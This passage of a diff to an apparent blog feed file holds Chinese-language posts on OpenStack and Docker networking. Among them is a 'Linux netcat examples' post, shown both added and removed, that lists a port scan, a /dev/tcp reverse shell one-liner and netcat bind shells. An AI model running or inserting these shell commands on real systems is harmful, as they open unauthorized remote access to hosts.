+<figure class="highlight routeros"><table><tr><td class="code"><pre><div class="line"><span class="comment">#添加FAKE公网网关</span></div><div class="line">ovs-vsctl add-port br-ex gwp -- <span class="builtin-name">set</span><span class="built_in"> interface </span>gwp <span class="attribute">type</span>=internal</div><div class="line">ifconfig gwp 10.10.10.1 netmask 255.255.255.0</div><div class="line"><span class="comment">#添加SNAT规则允许虚拟机访问外网 </span></div><div class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -s 10.10.10.0/24 -j MASQUERADE</div><div class="line"><span class="comment">#允许转发，添加允许转发或者删除默认的REJECT规则都可以</span></div><div class="line"><span class="comment">#iptables -D FORWARD -j REJECT --reject-with icmp-host-prohibited</span></div><div class="line">iptables -t<span class="built_in"> filter </span>-I FORWARD -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment">#开启内核转发</span></div><div class="line">sysctl -w net.ipv4.conf.eth0.<span class="attribute">rp_filter</span>=0</div><div class="line">sysctl -w net.ipv4.conf.gwp.<span class="attribute">rp_filter</span>=0</div><div class="line">sysctl -w net.ipv4.<span class="attribute">ip_forward</span>=1</div></pre></td></tr></table></figure>
+<p>如果想从外部访问虚拟机的话，可以通过类似的方法将虚拟机的22端口映射到主机的eth0上来：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><div class="line"><span class="comment">#假设eth0的ip地址为192.168.33.22</span></div><div class="line">iptables -t<span class="built_in"> nat </span>-I OUTPUT -d 192.168.33.22/32 -p tcp -m tcp --dport 2222 -j DNAT --to-destination 10.10.10.5:22</div><div class="line">iptables -t<span class="built_in"> nat </span>-I FORWORD ! -i enp1s0f0 ! -o enp1s0f0 -m conntrack ! --ctstate DNAT -j ACCEPT</div><div class="line">iptables -t<span class="built_in"> nat </span>-I PREROUTING -d 192.168.33.22/32 -p tcp -m tcp --dport 2222 -j DNAT --to-destination 10.10.10.5:22</div><div class="line"></div><div class="line"><span class="comment">#iptables -t nat -I POSTROUTING -s 10.10.10.5/32 -p tcp -m tcp --sport 2222 -j SNAT --to-source 192.168.33.22:22</span></div><div class="line"><span class="comment">#iptables -t nat -I POSTROUTING -s 10.10.10.0/24 -j SNAT --to-source 192.168.33.22</span></div></pre></td></tr></table></figure>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> OpenStack </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Setting up GRE for Kubernetes]]></title>
+      <url>http://feisky.xyz/2015/03/01/setting-up-gre-for-kubernetes/</url>
+      <content type="html"><![CDATA[<p>首先修改Docker的默认网桥：</p>
+<figure class="highlight vala"><table><tr><td class="code"><pre><div class="line"><span class="meta">#停止Docker Daemon进程</span></div><div class="line">systemctl stop docker</div><div class="line"></div><div class="line"><span class="meta">#设置默认网桥docker0为down，并删除</span></div><div class="line">ip link <span class="keyword">set</span> dev docker0 down</div><div class="line">brctl delbr docker0</div><div class="line"></div><div class="line"><span class="meta">#新建Linux网桥localbr0</span></div><div class="line">brctl addbr localbr0</div><div class="line"></div><div class="line"><span class="meta">#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复</span></div><div class="line">ip addr add <span class="number">10.10</span><span class="number">.2</span><span class="number">.1</span>/<span class="number">24</span> dev localbr0</div><div class="line">ip link <span class="keyword">set</span> dev localbr0 up</div><div class="line"></div><div class="line">echo <span class="string">'OPTIONS="--bridge localbr0 --iptables=false"'</span>&gt;&gt;/etc/sysconfig/docker</div><div class="line">systemctl start Docker</div></pre></td></tr></table></figure>
+<p>为上述网桥添加GRE连接</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><div class="line"><span class="comment">#新建Openvswitch网桥</span></div><div class="line">ovs-vsctl add-br ovsbr</div><div class="line"></div><div class="line"><span class="comment">#启用STP协议防止网桥环路</span></div><div class="line">ovs-vsctl <span class="builtin-name">set</span><span class="built_in"> bridge </span>ovsbr <span class="attribute">stp_enable</span>=<span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment">#添加ovsbr到本地localbr0，使得容器流量通过OVS流经GRE Tunnel</span></div><div class="line">brctl addif localbr0 ovsbr<span class="built_in"></span></div><div class="line">ip link <span class="builtin-name">set</span> dev ovsbr up</div><div class="line"></div><div class="line"><span class="comment">#创建GRE</span></div><div class="line">ovs-vsctl add-port ovsbr tep0 -- <span class="builtin-name">set</span><span class="built_in"> interface </span>tep0 <span class="attribute">type</span>=internal</div><div class="line"></div><div class="line"><span class="comment">#需在每个主机上修改tep0 IP地址</span><span class="built_in"></span></div><div class="line">ip addr <span class="builtin-name">add</span> 192.168.1.1/24 dev tep0<span class="built_in"></span></div><div class="line">ip addr <span class="builtin-name">add</span> 192.168.1.2/24 dev tep0<span class="built_in"></span></div><div class="line">ip link <span class="builtin-name">set</span> dev tep0 up</div><div class="line"></div><div class="line"><span class="comment">#使用GRE隧道连接每个主机上的Openvswitch网桥</span></div><div class="line"><span class="comment">#192.168.0.127</span></div><div class="line">ovs-vsctl add-port ovsbr gre0 -- <span class="builtin-name">set</span><span class="built_in"> interface </span>gre0 <span class="attribute">type</span>=gre options:<span class="attribute">remote_ip</span>=192.168.0.128</div><div class="line"></div><div class="line"><span class="comment">#192.168.0.128</span></div><div class="line">ovs-vsctl add-port ovsbr gre0 -- <span class="builtin-name">set</span><span class="built_in"> interface </span>gre0 <span class="attribute">type</span>=gre options:<span class="attribute">remote_ip</span>=192.168.0.127</div><div class="line"></div><div class="line"><span class="comment">#配置路由使得跨主机间容器的通信</span><span class="built_in"></span></div><div class="line">ip route <span class="builtin-name">add</span> 10.10.0.0/16 dev tep0</div><div class="line"></div><div class="line"><span class="comment">#为了使得容器访问Internet，在两台主机上配置NAT</span></div><div class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -s 10.10.0.0/16 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> Docker </tag>
             
         </tags>
         
@@ -3940,42 +3976,6 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
-      <title><![CDATA[How enable OpenStack allinone vm to access external network]]></title>
-      <url>http://feisky.xyz/2015/03/01/how-enable-openstack-allinone-vm-to-access-external-network/</url>
-      <content type="html"><![CDATA[<p>首先需要为OpenStack添加一个公网网络，假设All-in-one环境建的公网网段为10.10.10.0/24，公网网关为10.10.10.1。这样为虚拟机绑定公网IP后，由于网关是不存在的，虚拟机无法访问外网。那虚拟机如果想访问外网怎么办呢？</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><div class="line"><span class="comment">#添加FAKE公网网关</span></div><div class="line">ovs-vsctl add-port br-ex gwp -- <span class="builtin-name">set</span><span class="built_in"> interface </span>gwp <span class="attribute">type</span>=internal</div><div class="line">ifconfig gwp 10.10.10.1 netmask 255.255.255.0</div><div class="line"><span class="comment">#添加SNAT规则允许虚拟机访问外网 </span></div><div class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -s 10.10.10.0/24 -j MASQUERADE</div><div class="line"><span class="comment">#允许转发，添加允许转发或者删除默认的REJECT规则都可以</span></div><div class="line"><span class="comment">#iptables -D FORWARD -j REJECT --reject-with icmp-host-prohibited</span></div><div class="line">iptables -t<span class="built_in"> filter </span>-I FORWARD -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment">#开启内核转发</span></div><div class="line">sysctl -w net.ipv4.conf.eth0.<span class="attribute">rp_filter</span>=0</div><div class="line">sysctl -w net.ipv4.conf.gwp.<span class="attribute">rp_filter</span>=0</div><div class="line">sysctl -w net.ipv4.<span class="attribute">ip_forward</span>=1</div></pre></td></tr></table></figure>
-<p>如果想从外部访问虚拟机的话，可以通过类似的方法将虚拟机的22端口映射到主机的eth0上来：</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><div class="line"><span class="comment">#假设eth0的ip地址为192.168.33.22</span></div><div class="line">iptables -t<span class="built_in"> nat </span>-I OUTPUT -d 192.168.33.22/32 -p tcp -m tcp --dport 2222 -j DNAT --to-destination 10.10.10.5:22</div><div class="line">iptables -t<span class="built_in"> nat </span>-I FORWORD ! -i enp1s0f0 ! -o enp1s0f0 -m conntrack ! --ctstate DNAT -j ACCEPT</div><div class="line">iptables -t<span class="built_in"> nat </span>-I PREROUTING -d 192.168.33.22/32 -p tcp -m tcp --dport 2222 -j DNAT --to-destination 10.10.10.5:22</div><div class="line"></div><div class="line"><span class="comment">#iptables -t nat -I POSTROUTING -s 10.10.10.5/32 -p tcp -m tcp --sport 2222 -j SNAT --to-source 192.168.33.22:22</span></div><div class="line"><span class="comment">#iptables -t nat -I POSTROUTING -s 10.10.10.0/24 -j SNAT --to-source 192.168.33.22</span></div></pre></td></tr></table></figure>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> OpenStack </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Setting up GRE for Kubernetes]]></title>
-      <url>http://feisky.xyz/2015/03/01/setting-up-gre-for-kubernetes/</url>
-      <content type="html"><![CDATA[<p>首先修改Docker的默认网桥：</p>
-<figure class="highlight vala"><table><tr><td class="code"><pre><div class="line"><span class="meta">#停止Docker Daemon进程</span></div><div class="line">systemctl stop docker</div><div class="line"></div><div class="line"><span class="meta">#设置默认网桥docker0为down，并删除</span></div><div class="line">ip link <span class="keyword">set</span> dev docker0 down</div><div class="line">brctl delbr docker0</div><div class="line"></div><div class="line"><span class="meta">#新建Linux网桥localbr0</span></div><div class="line">brctl addbr localbr0</div><div class="line"></div><div class="line"><span class="meta">#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复</span></div><div class="line">ip addr add <span class="number">10.10</span><span class="number">.2</span><span class="number">.1</span>/<span class="number">24</span> dev localbr0</div><div class="line">ip link <span class="keyword">set</span> dev localbr0 up</div><div class="line"></div><div class="line">echo <span class="string">'OPTIONS="--bridge localbr0 --iptables=false"'</span>&gt;&gt;/etc/sysconfig/docker</div><div class="line">systemctl start Docker</div></pre></td></tr></table></figure>
-<p>为上述网桥添加GRE连接</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><div class="line"><span class="comment">#新建Openvswitch网桥</span></div><div class="line">ovs-vsctl add-br ovsbr</div><div class="line"></div><div class="line"><span class="comment">#启用STP协议防止网桥环路</span></div><div class="line">ovs-vsctl <span class="builtin-name">set</span><span class="built_in"> bridge </span>ovsbr <span class="attribute">stp_enable</span>=<span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment">#添加ovsbr到本地localbr0，使得容器流量通过OVS流经GRE Tunnel</span></div><div class="line">brctl addif localbr0 ovsbr<span class="built_in"></span></div><div class="line">ip link <span class="builtin-name">set</span> dev ovsbr up</div><div class="line"></div><div class="line"><span class="comment">#创建GRE</span></div><div class="line">ovs-vsctl add-port ovsbr tep0 -- <span class="builtin-name">set</span><span class="built_in"> interface </span>tep0 <span class="attribute">type</span>=internal</div><div class="line"></div><div class="line"><span class="comment">#需在每个主机上修改tep0 IP地址</span><span class="built_in"></span></div><div class="line">ip addr <span class="builtin-name">add</span> 192.168.1.1/24 dev tep0<span class="built_in"></span></div><div class="line">ip addr <span class="builtin-name">add</span> 192.168.1.2/24 dev tep0<span class="built_in"></span></div><div class="line">ip link <span class="builtin-name">set</span> dev tep0 up</div><div class="line"></div><div class="line"><span class="comment">#使用GRE隧道连接每个主机上的Openvswitch网桥</span></div><div class="line"><span class="comment">#192.168.0.127</span></div><div class="line">ovs-vsctl add-port ovsbr gre0 -- <span class="builtin-name">set</span><span class="built_in"> interface </span>gre0 <span class="attribute">type</span>=gre options:<span class="attribute">remote_ip</span>=192.168.0.128</div><div class="line"></div><div class="line"><span class="comment">#192.168.0.128</span></div><div class="line">ovs-vsctl add-port ovsbr gre0 -- <span class="builtin-name">set</span><span class="built_in"> interface </span>gre0 <span class="attribute">type</span>=gre options:<span class="attribute">remote_ip</span>=192.168.0.127</div><div class="line"></div><div class="line"><span class="comment">#配置路由使得跨主机间容器的通信</span><span class="built_in"></span></div><div class="line">ip route <span class="builtin-name">add</span> 10.10.0.0/16 dev tep0</div><div class="line"></div><div class="line"><span class="comment">#为了使得容器访问Internet，在两台主机上配置NAT</span></div><div class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -s 10.10.0.0/16 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> Docker </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[Integrating Openstack and Kubernetes with Murano]]></title>
       <url>http://feisky.xyz/2015/02/25/integrating-openstack-and-kubernetes-with-murano/</url>
       <content type="html"><![CDATA[<p>There’s a perceived competition between OpenStack and containers such as Docker, but in reality, the two technologies are a powerful combination. They both solve similar problems, but on different layers of the stack, so combining the two can give users more scalability and automation than ever before.</p>
@@ -4038,61 +4038,6 @@ From the host try to ping the guest. With the virtual machine configuration desc
         <tags>
             
             <tag> Docker </tag>
-            
-            <tag> OpenStack </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Going Native with OpenStack Centric Applications: Overview]]></title>
-      <url>http://feisky.xyz/2015/02/25/going-native-with-openstack-centric-applications-overview/</url>
-      <content type="html"><![CDATA[<p>Cloud infrastructure is useless without applications running atop, providing business services and&nbsp;solving customer needs. So, as applications ascend to the throne as the rightful king of cloud, focus sharpens on their support within OpenStack-based clouds.&nbsp;With this focus, let’s walk through a survey of components and projects supporting applications in OpenStack, understanding what a&nbsp;day in the life of an application in OpenStack is like. We’ll start with an overview of the application ecosystem comprised of a number of supporting projects. In the ecosystem overview below, relevant OpenStack projects are presented in context of existing, similar technologies with which you may be familiar. These similar technologies both under and overlap functionality of the respective OpenStack project, but are shown to hasten your general&nbsp;understanding of which bucket these projects fall into by way of tech you may already know (so, add a pinch of salt when considering relevancy of suggested affiliated technologies).</p>
-<h3 id="Application-Ecosystem-by-Project"><a href="#Application-Ecosystem-by-Project" class="headerlink" title="Application Ecosystem by Project"></a>Application Ecosystem by Project</h3><p>Like individual lines in a product family, projects within OpenStack engulf and extend one another for related, but distinct purposes and target use cases. OpenStack developers are cautious to apply DRY principles in their approach to project design, integrating functionality rather than reinventing the wheel as they go. The <em>Project Focus and Relationship</em> diagram both figuratively and literally places project relationships into round bubbles, identifying conceptual starting points for the genesis of an application as well as the reuse of some projects by others.</p>
-<p><img src="/assets/OpenStack-Centric-Applications-Project-Focus-and-Relationship.png" alt=""></p>
-<ul>
-<li><p><strong>Application Blueprint Designer –&nbsp;<a href="https://wiki.openstack.org/wiki/Merlin" target="_blank" rel="external">Merlin</a></strong></p>
-<ul>
-<li>RavelloSystems, UrbanCode, CliQr, Prime Service Catalog*…</li>
-</ul>
-</li>
-<li><p><strong>Application Lifecycle Management PaaS – <a href="https://wiki.openstack.org/wiki/Solum" target="_blank" rel="external">Solum</a></strong></p>
-<ul>
-<li>Similar technologies (ALM) – Atlassian Suite, HP ALM, Cloudpipes, Serena…</li>
-<li>Similar technologies (PaaS) – Openshift, Cloud Foundry, BlueMix, AppScale, Heroku, App Engine…</li>
-</ul>
-</li>
-<li><p><strong>Application Catalog –&nbsp;<a href="https://wiki.openstack.org/wiki/Murano" target="_blank" rel="external">Murano</a></strong></p>
-<ul>
-<li>Similar technologies – AppStack, CliQr, ITApp, AppDirect…</li>
-</ul>
-</li>
-<li><p><strong>Application Stack Provisioning – <a href="https://wiki.openstack.org/wiki/Heat" target="_blank" rel="external">Heat</a>,&nbsp;Magnum</strong></p>
-<ul>
-<li>Similar technologies – AWS Elastic Beanstalk, Kubernetes, GearD, Warden, Fleet, MaestroNG, CliQr, Nirmata…</li>
-</ul>
-</li>
-<li><p><strong>Application Containers –&nbsp;<a href="https://wiki.openstack.org/wiki/Docker" target="_blank" rel="external">Docker</a></strong></p>
-<ul>
-<li>Similar technologies – OpenVZ, Linux V-Server, FreeBSD jails,&nbsp;AIX&nbsp;Workload Partitions&nbsp;and&nbsp;Solaris Containers</li>
-</ul>
-</li>
-<li><p><strong>Application Configuration Management – Puppet, Chef</strong></p>
-<ul>
-<li>Similar technologies – Heat, Salt, Ansible, <a href="https://wiki.openstack.org/wiki/Satori" target="_blank" rel="external">Satori</a>*…</li>
-</ul>
-</li>
-</ul>
-<h3 id="A-Day-in-the-Life-of-an-OpenStack-Native-Application"><a href="#A-Day-in-the-Life-of-an-OpenStack-Native-Application" class="headerlink" title="A Day in the Life of an OpenStack-Native Application"></a>A Day in the Life of an OpenStack-Native Application</h3><p>The <em>Application Lifecycle Flows</em> diagram defines different&nbsp;entrance points by which applications are birthed and the flow between different OpenStack projects within their lifecycle.</p>
-<p><img src="/assets/OpenStack-Centric-Applications-Application-Lifecycle-Flows.png" alt=""></p>
-<p>Users may&nbsp;<strong>design</strong> applications with Merlin,&nbsp;<strong>develop</strong>&nbsp;applications with Solum,&nbsp;<strong>order</strong> applications with Murano,&nbsp;<strong>deploy</strong> applications and resources with Heat and&nbsp;<strong>manage</strong> applications with Puppet/other configuration managers.</p>
-<h3 id="“Applications”"><a href="#“Applications”" class="headerlink" title="“Applications”"></a>“Applications”</h3><p>Given that applications are varied in nature both in terms of their type and complexity, let’s take a moment to review their possible shapes and sizes. With regard to types of applications, some are &nbsp;image-based and some are container-based while others are offered simply as a&nbsp;SaaS subscription (implying that a singular instance of this application may serve multiple tenants). Applications may be cloud-native (designed to be scaled out, highly distributed, service-oriented) or enterprise-architected (designed to be scaled up, designed with layers and functional domains). Application complexity ranges from single component (image or container) to multiple component, multiple environment, multiple OpenStack deployments to OpenStack and other systems. Applications may be comprised of multiple components (e.g. MySQL, PHP, Apache) or a singular components (MySQL). Application components may be distributed or contained within a given container, VM or cloud. With these possibilities in mind,&nbsp;let’s begin our survey of their support with the&nbsp;OpenStack-native application catalog – Murano in the next post in this series.</p>
-<p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/</a></p>
-]]></content>
-      
-        
-        <tags>
             
             <tag> OpenStack </tag>
             
@@ -4218,6 +4163,61 @@ From the host try to ping the guest. With the virtual machine configuration desc
 </li>
 </ul>
 <p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-murano/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-murano/</a></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> OpenStack </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Going Native with OpenStack Centric Applications: Overview]]></title>
+      <url>http://feisky.xyz/2015/02/25/going-native-with-openstack-centric-applications-overview/</url>
+      <content type="html"><![CDATA[<p>Cloud infrastructure is useless without applications running atop, providing business services and&nbsp;solving customer needs. So, as applications ascend to the throne as the rightful king of cloud, focus sharpens on their support within OpenStack-based clouds.&nbsp;With this focus, let’s walk through a survey of components and projects supporting applications in OpenStack, understanding what a&nbsp;day in the life of an application in OpenStack is like. We’ll start with an overview of the application ecosystem comprised of a number of supporting projects. In the ecosystem overview below, relevant OpenStack projects are presented in context of existing, similar technologies with which you may be familiar. These similar technologies both under and overlap functionality of the respective OpenStack project, but are shown to hasten your general&nbsp;understanding of which bucket these projects fall into by way of tech you may already know (so, add a pinch of salt when considering relevancy of suggested affiliated technologies).</p>
+<h3 id="Application-Ecosystem-by-Project"><a href="#Application-Ecosystem-by-Project" class="headerlink" title="Application Ecosystem by Project"></a>Application Ecosystem by Project</h3><p>Like individual lines in a product family, projects within OpenStack engulf and extend one another for related, but distinct purposes and target use cases. OpenStack developers are cautious to apply DRY principles in their approach to project design, integrating functionality rather than reinventing the wheel as they go. The <em>Project Focus and Relationship</em> diagram both figuratively and literally places project relationships into round bubbles, identifying conceptual starting points for the genesis of an application as well as the reuse of some projects by others.</p>
+<p><img src="/assets/OpenStack-Centric-Applications-Project-Focus-and-Relationship.png" alt=""></p>
+<ul>
+<li><p><strong>Application Blueprint Designer –&nbsp;<a href="https://wiki.openstack.org/wiki/Merlin" target="_blank" rel="external">Merlin</a></strong></p>
+<ul>
+<li>RavelloSystems, UrbanCode, CliQr, Prime Service Catalog*…</li>
+</ul>
+</li>
+<li><p><strong>Application Lifecycle Management PaaS – <a href="https://wiki.openstack.org/wiki/Solum" target="_blank" rel="external">Solum</a></strong></p>
+<ul>
+<li>Similar technologies (ALM) – Atlassian Suite, HP ALM, Cloudpipes, Serena…</li>
+<li>Similar technologies (PaaS) – Openshift, Cloud Foundry, BlueMix, AppScale, Heroku, App Engine…</li>
+</ul>
+</li>
+<li><p><strong>Application Catalog –&nbsp;<a href="https://wiki.openstack.org/wiki/Murano" target="_blank" rel="external">Murano</a></strong></p>
+<ul>
+<li>Similar technologies – AppStack, CliQr, ITApp, AppDirect…</li>
+</ul>
+</li>
+<li><p><strong>Application Stack Provisioning – <a href="https://wiki.openstack.org/wiki/Heat" target="_blank" rel="external">Heat</a>,&nbsp;Magnum</strong></p>
+<ul>
+<li>Similar technologies – AWS Elastic Beanstalk, Kubernetes, GearD, Warden, Fleet, MaestroNG, CliQr, Nirmata…</li>
+</ul>
+</li>
+<li><p><strong>Application Containers –&nbsp;<a href="https://wiki.openstack.org/wiki/Docker" target="_blank" rel="external">Docker</a></strong></p>
+<ul>
+<li>Similar technologies – OpenVZ, Linux V-Server, FreeBSD jails,&nbsp;AIX&nbsp;Workload Partitions&nbsp;and&nbsp;Solaris Containers</li>
+</ul>
+</li>
+<li><p><strong>Application Configuration Management – Puppet, Chef</strong></p>
+<ul>
+<li>Similar technologies – Heat, Salt, Ansible, <a href="https://wiki.openstack.org/wiki/Satori" target="_blank" rel="external">Satori</a>*…</li>
+</ul>
+</li>
+</ul>
+<h3 id="A-Day-in-the-Life-of-an-OpenStack-Native-Application"><a href="#A-Day-in-the-Life-of-an-OpenStack-Native-Application" class="headerlink" title="A Day in the Life of an OpenStack-Native Application"></a>A Day in the Life of an OpenStack-Native Application</h3><p>The <em>Application Lifecycle Flows</em> diagram defines different&nbsp;entrance points by which applications are birthed and the flow between different OpenStack projects within their lifecycle.</p>
+<p><img src="/assets/OpenStack-Centric-Applications-Application-Lifecycle-Flows.png" alt=""></p>
+<p>Users may&nbsp;<strong>design</strong> applications with Merlin,&nbsp;<strong>develop</strong>&nbsp;applications with Solum,&nbsp;<strong>order</strong> applications with Murano,&nbsp;<strong>deploy</strong> applications and resources with Heat and&nbsp;<strong>manage</strong> applications with Puppet/other configuration managers.</p>
+<h3 id="“Applications”"><a href="#“Applications”" class="headerlink" title="“Applications”"></a>“Applications”</h3><p>Given that applications are varied in nature both in terms of their type and complexity, let’s take a moment to review their possible shapes and sizes. With regard to types of applications, some are &nbsp;image-based and some are container-based while others are offered simply as a&nbsp;SaaS subscription (implying that a singular instance of this application may serve multiple tenants). Applications may be cloud-native (designed to be scaled out, highly distributed, service-oriented) or enterprise-architected (designed to be scaled up, designed with layers and functional domains). Application complexity ranges from single component (image or container) to multiple component, multiple environment, multiple OpenStack deployments to OpenStack and other systems. Applications may be comprised of multiple components (e.g. MySQL, PHP, Apache) or a singular components (MySQL). Application components may be distributed or contained within a given container, VM or cloud. With these possibilities in mind,&nbsp;let’s begin our survey of their support with the&nbsp;OpenStack-native application catalog – Murano in the next post in this series.</p>
+<p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/</a></p>
 ]]></content>
       
         
@@ -4495,7 +4495,7 @@ From the host try to ping the guest. With the virtual machine configuration desc
 </li>
 <li>docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]<ul>
 <li># 提交指定容器为镜像</li>
-<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#104;&#97;&#110;&#110;&#105;&#x62;&#x61;&#x6c;&#x40;&#x61;&#45;&#116;&#101;&#x61;&#x6d;&#x2e;&#99;&#111;&#109;">&#104;&#97;&#110;&#110;&#105;&#x62;&#x61;&#x6c;&#x40;&#x61;&#45;&#116;&#101;&#x61;&#x6d;&#x2e;&#99;&#111;&#109;</a>“)</li>
+<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#x68;&#97;&#x6e;&#110;&#105;&#98;&#x61;&#108;&#64;&#97;&#45;&#116;&#x65;&#97;&#109;&#46;&#99;&#111;&#109;">&#x68;&#97;&#x6e;&#110;&#105;&#98;&#x61;&#108;&#64;&#97;&#45;&#116;&#x65;&#97;&#109;&#46;&#99;&#111;&#109;</a>“)</li>
 <li>-m, —message=””    Commit message</li>
 <li>-p, —pause=true    Pause container during commit<ul>
 <li># 默认 commit 是暂停状态</li>
@@ -4931,6 +4931,37 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
+      <title><![CDATA[Linux netcat examples]]></title>
+      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
+      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
+<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
+<p>Server: nc -l 1567 &lt; file.txt </p>
+<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
+<p>Client to Server:</p>
+<p>Server: nc -l 1567 &gt; file.txt</p>
+<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
+<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
+<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
+<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
+<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[How to use docker compose to deploy a flask app]]></title>
       <url>http://feisky.xyz/2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/</url>
       <content type="html"><![CDATA[<p>The flask app is very simple, you have an index page where your can write and read comments.</p>
@@ -5168,37 +5199,6 @@ ADD static/ /www/static
         <tags>
             
             <tag> Docker </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Linux netcat examples]]></title>
-      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
-      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
-<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567</p>
-<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
-<p>Server: nc -l 1567 &lt; file.txt </p>
-<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
-<p>Client to Server:</p>
-<p>Server: nc -l 1567 &gt; file.txt</p>
-<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
-<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
-<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
-<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
-<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
-<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
-<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
-<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> Linux </tag>
             
         </tags>
         
@@ -7428,45 +7428,6 @@ ADD static/ /www/static
     </entry>
     
     <entry>
-      <title><![CDATA[cannot change locale]]></title>
-      <url>http://feisky.xyz/2015/02/09/cannot-change-locale/</url>
